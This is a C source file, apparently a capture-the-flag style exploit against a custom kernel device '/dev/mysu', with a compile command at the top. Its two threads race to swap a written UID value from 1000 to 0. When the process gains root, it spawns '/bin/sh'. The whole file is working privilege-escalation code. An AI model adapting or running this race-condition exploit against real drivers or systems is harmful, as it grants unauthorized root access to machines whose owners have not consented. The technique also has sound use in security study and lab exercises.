//gcc exploit.c -o exploit -s -static -lpthread

#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <limits.h>
#include <unistd.h>
#include <pthread.h>
// Specify payload of UID 0 with correct hash value
unsigned char payload[] = {
	0x00, 0x00, 0x00, 0x00,
	0x6e,0x63,0x7b,0x89,0x0,0x0,0x0,0x40
};
int stop = 0;
// Create thread to authenticate as UID 1000
void *uid1000_thread()
{
	while (!stop)
	{
		int fd1 = open("/dev/mysu", O_RDWR);
		payload[0] = 0xe8;
		payload[1] = 0x03;
		write(fd1, payload, sizeof(payload));
		close(fd1);
		if(getuid() == 0)
		{
			stop = 1;
			printf("Gained UID 0\n");
			system("/bin/sh");
		}
	}
};

// Create a thread to constantly change to UID 0
void *uid0_thread()
{
	while(!stop)
	{
		payload[0] = 0x00;
		payload[1] = 0x00;
		if(getuid() == 0)
		{
			stop = 1;
			printf("Gained UID 0\n");
			system("/bin/sh");
		}
	}
}
int main(int argc, char *argv[])
{
	pthread_t thread1_id;
	pthread_t thread2_id;
	pthread_create(&thread1_id, NULL, uid0_thread, NULL);
	pthread_create(&thread2_id, NULL, uid1000_thread, NULL);
	pthread_join(thread1_id, NULL);
	pthread_join(thread2_id, NULL);
};


